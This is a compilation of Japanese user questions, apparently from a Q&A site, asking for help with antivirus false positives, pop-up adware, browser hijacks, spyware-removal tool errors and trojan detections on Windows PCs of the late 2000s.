VOBファイルを分割するフリーウェア「vobtool」なんですが起動するためにアイコンをクリックすると以下のメッセージがでて動かなくなりました。 今までは問題なく動いていたのに突然です。 以下メッセージ 指定されたデバイス、パス、またはファイルにアクセスできません。アクセス許可がない可能性があります。 ウィルスバスター2009が自動アップデートしてからこのような状態になりました。 アイコンを右クリックで「セキュリティ脅威の検索」を行うとウィルス扱いにされてしまいます。 おそらく原因はウィルスバスターだと思うのですがどのような対策をすれば解決するのでしょうか？ ご教授ください。 ちなみに「ウイルスですので削除してください」みたいなトンチンカンなな回答はご遠慮願います。
ウイルス、スパイウエアー対策として、次のソフトを使用しています。 ・ウイルスバスター2009 ・a-squared Free ・Ad-Aware Anniversary Edition ・Spybot-Search&Destroy ・SuperAntiSpyware Free Edition（ver4.27.1000） SuperAntiSpyware（以下、SASと略します）でスキャンしようとすると、検索が始まると直ぐに終了してしまいます。 SASをアンインストール後、再インストールすると、インストール直後はスキャンを正常に行えますが、PCを再起動したり、後日PCを使用すると、SASのスキャンが上記のように開始直後に終了してしまいます。 ver4.26.1006から、この現象が起きるようになりました。それ以前のバージョンのver4.26.1004に戻して解決したこともあるのですが、最近は、旧バージョンに戻しても不具合が起こります。 ネットで調べたりしたのですが、解決方法が見当たらなかったため、質問させて頂きました。 PCのOSはxp(SP3)です。 どうぞ、よろしくお願いします。
Mozilla Firefoxを使ってます。 朝から、普通にネットを開くと、気付かないうちに身に覚えの無いサイトのページが次々と新しいウィンドウで開かれしまいます。 ゲームのサイトや出会い系のサイトみたいなものが多いです。 こういった現象の対処法をご存知の方は是非教えて頂けませんか？
カスペルスキーでtrojyan.win32.FraudPack.pir　というのが検出されたのですが、それがある場所（フォルダ名等）というのが自分のPC上には存在しません。いったいどこにあるのかわからないのですが、検出されたということは「ある」ということですよね？ また、ネットで検索してもこのtrojyanのFraudPackは情報があまりできてません。どう対処しようか困っております。
panda active scan で ウイルススキャンをしたところ、 hkey_classes_root\vbrad.trayicon　に アドウェア　Memory Watcher が見つかりました。 ----- MemoryWatcher http://www.pandasecurity.com/homeusers/security- … ----- どこかのサイトでspybotやad-awareでスキャンして 駆除すると良いとあったのでやってみましたが スキャンでは何も検出されませんでした。 regeditで hkey_classes_root\vbrad.trayicon を削除してしまっても大丈夫でしょうか。 これ自体はタスクトレイのレジストリとの事だったので 消さないほうがよいのかなと思うのですが…。 何か良いやり方があれば教えてください。よろしくお願いします。
vasdrvwin.exeというファイルを発見しました。 いろいろ調べているとマルウェアドロッパーらしいのですが 感染経路や深刻度等ご存知の方お教えください。
インターネットブラウザーを立ち上げて、目的の画面にて作業・内容確認等をしている最中に、心覚えのない画面が勝手に立ち上がります。何かの宣伝なのか、勧誘なのかわかりませんが、当初の目的の画面の応答も悪くなり迷惑しています。 このような画面が勝手に立ち上がらないようにしたいのですが、どのようにすればよいのかわかりませんので、教えていただきたく、よろしくお願いします。
友達（Aとします）から、バイト先で知り合ったプログラマ（Bとします）が私のメールを盗み読みしていることを知らされました。 Aに私の書いたメール（AでもＢでもない全く別の人宛のものです）の出力を見せびらかし、私のMacにネットワーク経由で進入したと自慢していたそうです。 メールの内容は、確かに私の書いた物でした。でも、Bに直接問い詰めてもトボケるばかりで、効果がありません。すごく腹が立ちます！ 証拠を突きつけてやりたいので、誰か助けてください！ 1）Macへのリモート操作の証拠はどこに残るの？ 私のMacでは、リモートログイン、リモートマネージメント、リモートアップルイベントは「切」の状態にしています。 でも不正にアクセスされた場合、どこかにログのようなものは残りますか？ 方法の分かる人、教えてくれると嬉しいです。 2）メールサーバーへのアクセス解析ってできるの？ もしメールのパスワードを盗まれてBが自分のPCから私のメールを見ているとしたら、POP3？ だかMaildir？ だか良く分からないんですけど、そこへのアクセスログって残りますか？ 見る方法の分かる人、教えてくれると助かります！
半月ほど前に海外サイトのブラクラらしきものを踏んで、何かしらのソフトを強制ＤＬせざるを得ない状況になりました。その後ソフトをアンインストールしたのですが、ＩＥを立ち上げたりサイトを移動する度に海外サイトの誘導窓が出現するので困っています。 あまりにひどいのでブラウザを変えたりウイルススキャンを繰り返しましたが、全く消える兆候がありません。システムの復元も幾度か試しましたが何故か全て未完了でした。 できればリカバリしたくないのですが、他に直す手立てはないでしょうか？ このブラクラがどういう状況でＰＣに張り付いているのかもわかりません。 本当に困っています。よろしくお願いします。
２～３日前から広告ページが勝手に立ち上がってしまうようになりました。 自分なりに色々調べてみたところ [Kuaiso Toolbar]というのが原因のようなのです。 手動削除をしたいと思うのですがやり方がわかりません。 どなたか回答お願いします。
ウィルスセキュリティ０を使用して、セキュリティー対策を行っておりますが、様々なＬＡＮの稼動障害のため、ファイアーウォール機能を停止していました。 ところが昨今のアップデートで、「完全開放したい」にもかかわらず、アップデートが自動で行われると、「条件的に遮断」に変わってしまいます。 典型的にＰＣをＯＮ/ＯＦＦにするとアップデートされてしまいます。 よってその度にプログラムをクリックして「完全開放」にしているのですが、とても面倒です。 ヘルプも読んだのですが、どうすれば固定的に、「完全開放」できますでしょうか？ ＰＣが素人なので、画面に沿ったご説明を望んでいます。 よろしくお願いいたします。
グーグルのホームページ(http://www.google.co.jp/ )が変です。　　　このページはツールバーで日本語に自動翻訳されていますという表示があります。　画面の右側にあるログインしてをクリックすると　このウエブサイトのセキュリティー証明書は問題があります。このウエブサイトで提示されたセキュリテイ証明書は信頼された証明機関から発行されたものでわありません。このウエブサイトで提示されたセキュリテイー証明書は別のウエブサイトのアドレス用に発行されたものです。セキュリテイ証明書の問題によって.詐欺やお使いのコンピューターからサーバーに送信される情報を盗み取る意図が示唆されている場合があります。このページ閉じてこのウエブサイトの閲覧を続行しないことを推奨します。という表示がでますがこのグーグルを完全に削除したいのですが削除法を教えてください。初心者ですのでよろしくお願いします。　
最近ネットで、調べごとをしていると、ページのが変わったり、新しくウィンドウが立ち上がったりしたときに、勝手に開いてもないサイトが開かれてしまってこまってます。 自力で調べてやってみた結果これがスパウェアの仕業だとわかったのでアドウェアーなどいくつか駆除ツールを使って駆除したんですが、駆除したにもかかわらずまたサイトが勝手に表示されてこまってますorz これが原因で個人情報、ネットゲームのＩＤやクレジット番号など、大切な情報がもれてしまわないか心配です。 家族も皆こまっており、私自身どうにかしようと毎日いろいろしているのですがなんともならず困ってます。 正直ストレス等がすごく辛いです。 詳しい方是非ご助力くださいorz
A-Squared Free 4.5を使用しています。従来、システム・スキャンに要する時間は40分ほどだったのですが、本日（７月16日）分の定義ファイルをダウンロードしてからスキャンしたところ、やたらに時間が掛かるようになってしまいました。スキャン開始から２時間半後の現在、プログレスバーはまだ75％までしか進んでいません。 前回のスキャン後システムに追加されたファイルは、Windowsの更新プログラム５点とIE7を8にアップデートしたことぐらいです。どういうわけで、こんなに遅くなったのでしょうか。同じような現象に見舞われた方、おられますか。 なお、他のセキュリティ・ソフト（SUPERAntiSpyware, Spybot, Ad-Aware AE, NOD32その他）のスキャン・スピードには変化がありません。OSはXP Pro SP3です。よろしくお願いします。
ネットゲームのセカンドライフの中の、ボイスチャットが、つい先日まで使えていたのですが、しばらくして、ウイルスバスターのメッセージが出て使えなくなってしまいました。 詳しくは忘れてしまいましたが、青い枠で ウイルスバスター２００９ （この部分はなんと書かれていたか忘れてしまったのですが、原因の？？番号も書かれてありました。） プログラム名　SLVoise.exe ・・・ というような表示が出ます。 最初は、危険度が高レベルだったので、怖かったのですが、許可してみました。でも、ボイスチャットは使えませんでした。 次に、Explorer8をインストールした後だったので、Explorer8をアンインストールしてみました。 今度は ウイルスバスター２００９ 疑わしいプログラムが拒否されました プログラム名　SLVoise.exe ・・・ という、危険度が低レベルという表示がでました。 ウイルスバスターの表示がでるので、ウイルスバスターが原因かと思いましたが、許可しても聞こえず、どうすればいいのかわかりません。 ウイルスバスター２００９が原因なのでしょうか？？ ウイルスバスター２００９も、つい最近、変えたばかりです。
OSはWPです。 SpywareBlaster 4.1を削除して、SpywareBlaster 4.2をインストールしようと思い、 デスクトップにインストーラーを保存出来たのですが、そこから先に進めません。 不明な発行元、とあり、実行をクリックしてもエラーになるのです。 もうどうして良いやら…教えて下さい！
こんにちは。 外国のツールバーをダウンロードしたら、パソコンがおかしくなりました。 すぐにアンインストールしましたが、ネットをしてると 勝手に新しいページがでてきます。 調べたらスパイウェアにやられているそうです…。 ソースネクストのウイルスセキュリティを使っているのですが、 ウイルス＆スパイウェアスキャンしても直りません。 スパイボットをダウンロードしてスキャンして、 セーフモードでもスキャンしてみましたが、やっぱり新しいページが 勝手にでてきてしまいます…。 全然駆除できていないのでしょうか。 もう他のやつをダウンロードしたくないんですが、 スパイボットだけで完全に駆除できる方法はありますか？ よろしくお願いします。
色々試してみたのですが、うまくいかないので質問させてください。 一週間ほど前から、パソコンの調子がよくないです。 起動した直後から、「仮想メモリが不足しています」みたいなメッセージが出て、タスクマネージャーで確認してみると、一つのプロセス（？）あたりが異常に高い数値を示しています。たとえば、タスクマネージャーのプロセスでは、20000KBもありました。 回線を遮断して起動してみるとメッセージは出てこないので、ウイルスやスパイウェアなどによるものだと思い、「a-squared　Free」、「AVG Free」、「ウイルスセキュリティ」で調べてみたのですが、何も発見されませんでした。他にどのようなことが考えられるでしょうか？回答お願いします。 ちなみに、メモリは1024MB、HDDは30GBですが、これまで何の不具合もありませんでした。
http://www.travian.jp/?ad=10258_1073940120&g=1 http://www.bigfishgames.jp/download-games/5341/a … http://www.brandnetic.com/brand-spotlight.html? http://banners.bigchurch.com/go/page/ad_bc_landi … などが勝手にポップアップで開いてしまいます。 邪魔なので出て来ないようにしたいのですがどうすればいいのでしょうか？ よろしくお願いします。
ブラックショットというオンラインゲームを起動すると、ポップアップウィンドウで (1)「疑わしい動作を検出しました。」と出ます。許可をクリックすると (2)「例外ルールの数が上限に達しているため、新しい例外ルールを追加できません。このルールを追加したい場合は、既存のルールのいずれかを削除してください。」と出ます。 それで、どうすればいいのかわからなかったので、とりあえずウィルスバスター2009の「不正変更の監視」辺りを見てもよくわからず、「見つかった変更」をクリックしたところ変更を検索しています。と出て、数分後 (3)「設定の読み込みに失敗しました。コンピュータを再起動して再度実行してください。問題が解決しない場合は、テクニカルサポートに連絡してください。」とでて (4)「Manages all components of Trend Micro Internet Security.は動作しなくなったため、閉じられました。 問題が発生したため、アプリケーションは正しく動作しなくなりました。解決策がある場合はWindowsから通知されます。」と出ます。 さっぱりわからなくなって何をどうすればいいのかわからなくなりました。 ブラックショットを起動できるようにして、ウィルスバスターも治したいのですが、どうすればいいでしょうか？
「MEGAVIDEO」と言う動画サイトにアクセス、登録しました。 登録後初使用でそのサイトとデザインが非常にそっくりな別サイト(明らかに誤認誘発目的と思われる)であったのに気が付かずにアクセス許可を与えて、インストールしてしまいました。 上記のような「GamingHarbor Toolbar」がツールバーの仲間入りしてしまいました。 ポップアップも不許可のはずなのに、立ち上がって来て来ています。、「instaiiAware Wizard」と書いてあります。 マウス左クリックで消去しようとしましたが、「閉じる」選択不可になっていて、そりの怪しげなサイトをダウンロード設定しないと別ウインドウも消えないようです。 以前似た手口でやられているので非常に不安で困っています。 よろしくお願いします。
warrockというオンラインゲームのサービスを利用しているのですが、先月からゲ ームを起動すると、ブルースクリーンになり、強制的に再起動させられる 症状がでるようになりました。 再起動後にwindowsから「XDVAnnn.sys」がマルウェアの 疑いがあるとして報告されます。 このオンラインゲーム運営に問い合わせたところ、「XDVAnnn.sys」はXTrapというソフトの一部（？）で、ゲームに必要なもので、セキュリティソフトが誤検知している可能性が見受けられるので、セキュリティソフト供給元に問い合わせてくれ、と指示され、問い合わせたのですが、セキュリティソフト供給元からの説明でもはっきりとした答えは出ません。 いままで正常に動いていたのに急に誤検知されるようになる事ってあるんでしょうか？ また、ユーザーにとって必要なものを誤検知した場合、どのように改善すればよいのでしょうか？ PCについてあまり詳しくないので、わかりにくい文章かもしれませんが、似たような症状に遭遇した方、または解決法をご存知の方、力を貸してください。 ちなみにOSはVistaです。 セキュリティソフトはウイルスフレッツクリアVer.4です。 よろしくお願いします。
Yahooのフリーメールを使用しています。 以前、懸賞などに登録してから いわゆる迷惑メールがたくさん届くようになり 一応、迷惑メールはゴミ箱へ直行するにしていますが 一通、件名から外国の友人からかと思って読もうと 開いたら どこかにリンクするアドレスしか書いていなくて もちろんクリックしませんでしたが それ以来、自分のヤフーアドレスから自分宛に 出会い系のお誘いのような恥ずかしい件名のメールが 届くようになり そのアドレスで誰かが多くの人に迷惑なメールを送りつけているみたいで それに関連したような件名のメールが沢山届いて困っています。 メールが届くだけの被害なら見なければ済むことですが ウイルスに感染したとか他に何か被害があったら 気味が悪いので、どうしたら良いかアドバイスよろしくお願いします。
質問お願いします。 ウイルスバスター2007の，危険なWebサイト(カテゴリ：ハッカー/プロキシ回避システム)という警告が そのアドレスにアクセスしたことが一度もない(履歴にもない)どころか ブラウザを起動していない状態でも出続け，消しても消さなくても 一定時間(数分)後に再び，延々と出続けます。 ちなみにアドレスは http://www8.big.or.jp/~000/CyberSyndrome/test.cgi http://www.cybersyndrome.net/pla.html で，この2つの警告がセットで出ます。上の方のURLは 何故か昨日までは異なり，確か http://www.cybersyndrome.net/ だったかと思います。 前述の通り，いずれのURLにもアクセスしておらず履歴にもありません。 これらのサイト自体に警告が出る(危険なサイトではないようですが) という事態は調べたところいくらかあるようですが， アクセスもしていないのに勝手に出る，しかも出続けるという事態は 今のところ発見できていません。 ウイルスバスター及びSpyBotで検索を試みたところ， 前者は何も見つからず後者で見つかったファイルは削除しましたが 依然警告が出ます。 ウイルスバスターは最新の状態になっています。 今のところ実害は警告が邪魔ということぐらいですが， 勝手にアクセスが行われているのだとすると 情報が抜き取られているのではと不安です。 是非ご回答をお願い致します。
オンラインゲームなどの掲示板を見ていた時に、キーロガーのウイルスを拾ってしまったみたいで、無料ウイルスバスターで排除しようとしたのですが、無料ウイルスバスターでどれがいいのか全くわかりません。何かオススメのウイルスバスターを教えてください
最新のスパイウェアを教えてください
10日ぶりにAd‐AwareAEで完全スキャン（セーフモードにて）してみたところ Win32 trojanDropper Delf というTAI１０のマルウェアが３つ検出されました。 Ad‐AwareAEによって検疫後、削除を試みたのですが 次の日にもう一度スキャンしてみたところ、もう一つ同じマルウェアが見つかりました。 こちらも同じ手段で削除し、それ以降は検出されていません。 ESET Smart SecurityV4.0やシマンテックオンラインスキャンでも 何も見つかりませんでした。 Ad-Awareのログによれば、 C:System Volume Information内の/RP135/A0016814.exeが感染？していたようなのですが、 隠しファイルの表示をONにしてみても、上のファイルは見当たりませんでした。 （既に検疫して削除したからでしょうか？） システムなどが不安定になっている様子は今のところありません。 Ad-Awareでの検疫→削除で、とりあえずは安心していいのでしょうか？ バックアップはたまにしていますが、なるべくならリカバリは避けたいもので…。 PCに触れて３年ですが、このような事態になったことがないので 凄く不安です(泣 セキュリティソフトやAd-Awareで常に保護し、スキャンで何も出ないのが常だったもので。 対策を施している皆様でも、たまにこういったマルウェアの侵入が 起こったりするものなのですか？ IE８の画面が見辛かったので未だIE７を使っていたり、 今までノートンINSを使っていたのを、ESETに乗り換えたりとしたので この辺に原因があるのかなぁとも考えています。
ソースネクストのウィルスセキュリティーゼロで ウィルス検査を実施したところ、 感染ファイルが１ と表示されました。 この場合、わたしのＰＣはすでにウィルスに感染しているのでしょうか？ このあとわたしはどのように対処すればよいのでしょうか？
windows 2000 pro sp4 rollup 1, spybot 1.6.2.46 アップデート検索を実行すると、下記application errorが発生します。 supportに問い合わせたのですが、no response です。 googleで調べたのですが、同じerrorがあります。 しかし、解決策が分かりません。 1.sdupdate.exe application error 　例外、不明なソフトウエア例外 (0×0eedfade)がアプリケーションの 0×77e7bcb1で発生しました 2.application error 　exception EInvalidCast in modeule SDUpdate.exe at 0007690B. 　Invalid class typecast よろしくお願いします。
2週間ほど前から、IEを開き、何かページを読み込む(たとえば、検索で検索結果が表示されるときなど)と、勝手に新しいウインドウが開いてしまいます。 現在、ウイルスバスター2009の機能でそのページ自体は表示されずにブロックされています。 アドレスバーを見てみると、毎回 ttp://****/hitin.php?land=20&affid=02919 というURLに飛ぼうとしてブロックされているようです。 スパイウエアかと思い、ウイルスバスター2009で全検索を行いましたが、 それらしきものは検出されませんでした。(Cockieが何個か検出されましたが、以前から検出されており、今回の件では関係ないと思われます。) タスクマネージャを見ても、それらしいプロセスも動いていませんでした。 原因が分かる方がいらっしゃいましたら、ご教授お願いいたします。 ●環境 OS:WindowsXP Professional Version 2002 Service Pack 3 セキュリティ製品:ウイルスバスター2009(最新アップデート適用) ブラウザ:InternetExplorer 6
先ほどPCをアンチウイルスソフトウェアでスキャンしてみたところLP.dllとopt～（すぐに隔離してしまったので詳細は忘れてしまいました）が有害であると出てきました。 以前どこかで見た記憶だとオプト～はスパイウェアであるということなのでとりあえず隔離しておきました。 LP.dllはよくわからないので一応これも隔離しておきました。 さて、お聞きしたいのは (1)これらは隔離という対応でよかったのか？ (2)LP.dllとopt～というのはどういう存在なのか？ ということです。 お知りの方がいらっしゃれば是非お教えください。
以前遊び半分で入ったサイトから迷惑メ-ルがきていたのですが、最近まではその迷惑メールが来なくなっていました。 が最近２、３日から頻繁に来るようになって困ってます。 そこの記載の中にこのような⇒『メール配信停止、退会をご希望される場合は本メールに記載されているURLよりログイン後、退会メニューよりご連絡下さい。 尚、停止及び退会処理にはお時間がかかる場合があります。予めご了承下さい。(最長22時間)』 と書いてあるのですが、ここに書いてあるURLからログインして退会処理しても大丈夫なのでしょうか？ 『そんなサイトに行ったお前が悪いよ！！』って言うのは解かってますが、宜しくお願い致します。
質問のタイトルそのままです。 ボットネットを取り締まる日本の組織は何でしょうか？ 教えてください。<(_ _)>
トレンドマイクロのウィルスバスターをインストールして、検索かけたら、adware_gain と　adware_gain.dashber が検出されました。 これらは何を意味するのですか?自分で調べてみたんですが、いまいちよく解りません。 駆除した方がいいのでしょうか。
パソコン初心者です。夫がアダルトサイト（無料の）を見たらしく、それ以来ＰＣの起動時やネット閲覧時に請求の広告が何度も出てきて困ってます。 （スパイウエアというんでしょうか…？？）色々調べてみて、「SpyBot」と「Ad-Aware」で駆除してみたのですが、それでも広告が出てきます。ウィルスバスターのようなものを買おうと行ったパソコン店で、「まずCookieを削除してみては？」と言われ削除したのですが、症状は変わりません。あとは、リカバリ（？）するしかないのでしょうか？パソコン購入時に業者の方に設定とかをお願いしたのですが、リカバリをするとそれも消えてしまうのか、またよく理解していない私がしても問題ないのか心配です。何か他に解決方法があるようでしたらお教えください。
先日firefoxをインストールしました。 ところがインストール直後から検索5回に1回ぐらいの割合で ウィンドウが勝手に開くと思ったら、見知らぬ広告でした・・・。 スパイウェアかと思い、spybotやAd-aware等のソフトでスキャンしてみましたが検出はゼロ。 sleipnirやIEではでません。firefoxのみです。 一度インストールし直してみましたが結果は変わらずやはり広告がでます。 セーフモードでのスキャンも試してみましたがだめでした。 ちなみにポップアップブロックはオンになっています。 どなたか対策をご存知の方はいらっしゃいませんでしょうか？ 窓がどんどん開くのでうっとうしくて本当に困っています。。。
ご存知の方ご指導願います。 タイトルの通り、403Error - Forbidden　が出てアクセスできない特に問題の無い(ソフト関係)サイトがありますがセキュリティの設定でアクセスできなくなっているものの解除設定を教えてください。 ソフトは、COMODO のFireWallのみを使用。 その他として、Avira　と　Spybot - Search & Destroyが入ってますが、こちらはあまり関係してないと思われますが、関連する設定があれば教えてください。
FireFox３を使っておりますが、 変更もしていないのにいつの間にか検索エンジンとホームページが"yoog.com"になっていました。 検索エンジンリストから"yoog.com"を削除し、ホームページも変更しましたが、再起動するとまた元に戻っております。 これは、フィッシングかスパイウエアの一種なのでしょうか？ オークションやネットバンキングにも利用しているので心配です。 解決策はありますか？ どなたか教えて下さい。
こんにちは 以前からマカフィーセキュリティスイート（アンチスパイ含）とSpyBot1.4を併用していました 競合する事も無く併用していましたが、いろいろ検索で閲覧したりマカフィーの動きがおかしい時にサポートで聞くとマカフィー側ではSpyBotを競合ソフトとしているのでアンインストするようにと指示されていました。 結局はいつもSpyBotのせいでは無くアンインストしなくてもマカフィーは修正できていましたが・・・・ 今回マカフィーの更新時になり新しく購入し同じ物をインストール作業をしていました しかし、インストール作業の途中で「競合するプログラム検索」にSpyBotが検出されアンインストしなければ先へ進めない状態になり渋々削除しました マカフィーのインスト作業が終わった時点でSpyBotを再インストしようかと悩んだのですが最新バージョン1.6では結構な不具合があるとのレビューを拝見しました（ブラウザによってはメールが全て消えたとか異常にメモリが喰うとか） そこでマカフィー側では推奨していない事ですし、この機会だから違うソフトを入れてみようかと思うのですがマカフィーと競合の無い日本語対応のアンチスパイソフトでお勧めを教えて頂きたいと思います ＯＳはＸＰ・ＳＰ２ ブラウザはＩＥ６です 宜しくお願い致します
ますか？
PC初心者です。お教え下さい。 PCを購入して１年少しになりますが ウイルス対策には、ウイルスバスターを使用しています ここ２週間前頃から、インターネットやエクセルなどの作業が終って 電源を切ろうとすると、必ずCAアンチスパイウエアーの有効期限が 切れましたので、更新の手続きをして下さい…というような メッセイジがでますが、ウイルスバスターだけではダメなのでしょうか？（最初は有効期限が切れます…から　切れましたに変わりました） 自分では、このソフトを入れた記憶は無いのですが。 やはり更新手続きをした方がよろしいのでしょうか？ この画面が気になるのですが、どのようにしたらよいのでしょうか？ 解りづらい説明で申し訳ございません。 PCの初心者です　お教え下さい。
スパイウエアチェックやウィルスチェックに引っかからない 新手の（マイナーな）やつって、有るんじゃ無いですかね 最近、変な、挙動をする時が、有るんですよ、チェックしても 出てこないし、トロイの木馬だけじゃ無いと思うんですよ 詳しい方、教えて下さい
とあるサイトを開いたときに同時に開けてしまう宣伝などをブロックする方法を教えていただけませんか。 例えばその宣伝サイトのアドレスを指定してブロック出来たり。 よろしくお願いします。
Hitman Pro3.5の使い方について質問させてください。 Hitman Proの使いかたを検索しても Hitman Pro2に関するページはたくさん出てくるのですが Hitman Pro3.5に関するページはほとんど出てきません。 Hitman Pro3.5を起動しても勝手に検索を始めてしまうので 設定などの仕方もわかりません。 アップデートなどもよくわかりません。 Hitman Proに詳しい方教えてください。
パソコンにはあまり詳しくありません。そのつもりでご回答をお願いします。 ある日パソコンを起動したら、ウイルスバスターがトロイの木馬を検知したと以下のような警告が出ました。ウイルス感染は今回が初めてです。 トロイの木馬プログラムが削除されました （コンピュータを再起動してください） 感染したファイル：uninstall.exe 場所：C:\Documents and Settings\All Users\スタート メニュー\プログラム\スタートアップ\uninstall.exe 脅威名：BKDR_SINOWAL.GH トレンドマイクロ社の提案：トロイの木馬プログラムが削除され、コンピュータへの攻撃が回避されました。ここでコンピュータを再起動して、脅威の痕跡を削除してください。 メッセージの通りPCを再起動したのですが、何回再起動しても同様のメッセージが出ます。 ウイルスバスタ－2009にてコンピュータ全体をウイルススキャンした結果、以下の表示がありました。 見つかったセキュリティ脅威はすべて処理されました。 項目：BKDR_SINOWAL.GH 状況：隔離済みのファイル 詳細：「対処できないウイルスに感染したファイルが、感染の拡大を防ぐため隔離しました」 そこで、 １．コンピュータへの攻撃が回避されましたとのことなので、このまま使い続けて平気なのでしょうか。（毎回PCを起動するときにメッセージが出るのは許容して） ２．このトロイの木馬を削除することは可能でしょうか？またその方法は？ OSはWindowsXP HomeEdition2002 SP3です。 以上、２点についてご教授願います。 長文失礼しました。
Spybot-S&Dの件で相談致したく思います。 うちのPCで、ウイルススキャンは週に一度Spybot-S&Dアップデートしなければいけないようで。 Spybot-S&Dアップデートしようと思ってクリックしたら、別ウィンドウズで「ミラー」欄が出てきました。そして、その欄には沢山の国名が並んでいまして。 「どのサーバからアップデートをダウンロードするか選択してください。 ユーザーが今いる場所に近いサーバーを選択するとアップデートがより早くダウンロードされることがあります」 というメッセージがあったのですが。 そのミラー欄の中には何故か「日本」がありませんでした。アメリカやドイツ等いっぱい国名が並んでいたのですが、 そのうち「（ユーザーが今いる場所に近いサーバー）日本に近い国」を選びたいのですが、それがどの国なのかよくわかりません。 Spybot-S&Dをお使いの皆さま、ご存知でしたらどうか教えて頂けませんでしょうか？ 選択する国の名前全文を教えて頂けたら、とても助かります。 お手数をお掛けいたしますが、どうぞよろしくお願い致します！！ あと、此処じゃ質問は違うかもしれませんが……常駐シールドalertからは 『「！」は警告を含んでいます』というメッセージが再び届いたので、 「修復」を繰り返しクリックしたのですが。何故か 『一部のファイルを修復出来ません 指定されたファイルは見つかりませんでした』 との結果が２回も出てしまいました。 「修復」をクリックしてみましたが、結局どうしても修復出来ませんでした。 PCにあまり詳しくない私にはこの原因はよく判らないです。 とにかく「修復」を試したものの、どうしても解決出来ませんでした。 （ほとんどウイルス隔離室にいってしまうみたいですけれど） 後はそのメッセージウィンドウズを閉じるしか無いですけれど、このままでいいのでしょうか？ このままの状況が連日続いてたりしたら、PCは壊れたりしませんか？ 機械知識に弱いのでとても心配です。何か解決策がありましたらどうか教えて下さいませ。 拙い文章で色々質問してしまいましたが、解りやすいアドバイスをどうかよろしくお願い致します！！
パソコン初心者です。インターネットのウイルス・スパイウエアーの件で教えて頂きたいのですが。 最近、光回線に変更をしたのですが、大学生の子供と私と、それぞれのパソコンを使用していますが 最近子供が色々なサイトやパソコンで友達と会話をしたりしているようです。 私は、仕事でパソコンを使用してます。１回線で複数のパソコンを使用している場合、パスワードやＩＤなど見られてしまう事はあるのでしょうか？ 子供達と回線を別にしたほうがよいのでしょうか？ ウイルスバスターには入っているのですが心配です。 安心して使用するにはどのようにしたらよいのでしょうか お教え下さい。　よろしくお願い致します。
すか？
ウィルスセキュリティゼロを使っているものです。 PCとps3をDLNAでファイル共有したいのですが、ファイアウォールが 邪魔をしていてつながりません。（ファイアウォールを切ると繋がります） どのように設定すれば、ファイアウォールを切ることなく 繋ぐことが可能でしょうか？
先ほどSpybot-Search&Destroy 1.6をインストールしました。 しかし、インストールオプションの選択でSDHelperとTeaTimerのチェックを外さないまま「次へ」をクリックしてしまいました。 インストール後にこの設定を変えることはできるのでしょうか？ できないのであれば、一度アンインストールしようと思うのですが、こちらの過去ログでアンインストールした方の質問を見たところ「プログラムの追加と削除」から行うだけでは駄目なようで、どのようにしたらいいのか不安です。 それと気になることがあるのですが、インストール後の初回起動時にコマンドプロンプトが一瞬表示され、そこに「エラー5」と表示されてた気がします。 これは何か不具合が起こるということなのでしょうか？ Spybot-Search&Destroyはインストール後まだなにも操作していない状態です。 スキャンもしていません。 OS：windows Vista セキュリティソフト：カスペルスキーインターネットセキュリティ2009 アドバイスいただけたら大変助かります。宜しくお願いします。 ここまで目を通していただきありがとうございました。
スパイウェア対策についてわからないことが多いので 一から勉強したいのですが、お勧めのサイトはありますか？ スパイウェアにはほかのウィルス対策ソフトと 一緒に常駐させても大丈夫なものとだめなものがあったりしますよね 数種類のスパイウェア対策ソフトをインストールしている方もいます このサイトを検索しても様々な情報があり一体なにがよいのやら混乱しています。 ですので良いと言われるソフトを調べて使ってみています。 使ってみてもどう良いのかがよくわかりません。 そもそもスパイウェア自体の理解が低いからやみくもに恐れてしまうのだと思います。 周りの情報に流されずある程度自分で選択できるくらいの知識が欲しいです。 ちなみに私の環境は VISTA　ホームプレミアム ウィルス対策：フレッツセキュリティ対策ソフト スパイ対策でAd-Awareを常駐させていました 補足情報として PC自体については検索してVISTAを高速化したり（レジストリもいじりました。） レディーブーストしたり といった程度の知識（経験？？）はあります。 スパイウェア対策、スパイウェアについて学べる環境をお教えくださいませ。
初めまして。Vistaのノートパソコンを使っています。 以前、クラッキングされてXPでMBR（マスターブートレコード）にスパイウェアが感染していたので Vistaでも感染しているのではないかと心配になっています。 VistaのMBRにスパイウェアが感染する可能性はあるのでしょうか。 （セキュリティにより難しくなっているらしいですが…） 詳しい方、教えてください。お願いします。
AD-AwareAEをインストールしようとしたところ 「この製品には少なくともwindows2000が必要です。セットアップが継続できません。 デスティネーションパスが不正です」 と出てインストールができません。 どなたかわかる方教えてください。 　 OS：vista
パソコン初心者です。未知の相手に対しメールアドレスを送ってしまった場合それにより銀行のIDやパスワードが読まれてしまうようなことがあるのでしょうか。お手数ですが教えていただけますか？
カルスペルスキー社が発表した住友銀行クラッキング事件について 史上最大のネット窃盗は、住友銀行ロンドン支店における200億ポンドのクラッキングである。 と言っていましたが、ポンドというと相当な額ですよね？ なぜロシア人が知っていて、当の日本人の私が住友銀行のネットワークシステムがハッキングされたことを知らないんでしょうか？ みなさんは知ってましたか？
初めてAd-Aware Free Anniversary Editionを使いました。 スキャンした結果　以下の通りになりました。 カテゴリ：Cookies オブジェクト：Privacy Object 数量：７ TAI：３ 推奨アクション：すべて削除 カテゴリ：unknown オブジェクト：unknown 数量：１ TAI：１ プロセス　npkcsvc 推奨アクション：１度だけ許可 ２項目目のスパイウェアは何ですか？ npkcsvcで調べても分かりませんでした。 削除しても問題ないのでしょうか？ すみませんが教えて下さい。宜しくお願い致します。
キーロガー検出ソフトのKL-Detectorをダウンロードしました。 ソフトを起動させてから、メモ帳を立ち上げて、任意の入力をしても「？」マークは変わらないですが、なぜか「？」マークにカーソルを ポイントすると、同じ時に続けてやってみて、時々「！」マークに変わる事があるので、キーロガーがあるのかないのか、判断できずすごく心配です。 使い方が悪いのかも知れませんが・・・ このソフトを使用する時、ソフトを起動するより前に常駐ソフトは停止しておいた方が良いとAll Aboutに書いてありました。常駐ソフトは全て停止しなければならないのでしょうか？ノートンを使っているので それは停止させていますが・・・・・ また、このソフトは検出するだけで駆除はできないみたいなのですが、 駆除できるソフトでできれば日本語の使いやすいソフトがあれば ご紹介頂きたいと思います。 お詳しい方、何卒宜しくお願い致します。
こんばんは。 先日、ウィルスバスター2009にてウィルス検索を実施したところ『Spyware_TRAK_Winvestigator』という謎のウィルスが出てきません。 ウェブ上を検索してもわかないのですが、このウィルスはなんでしょうか？
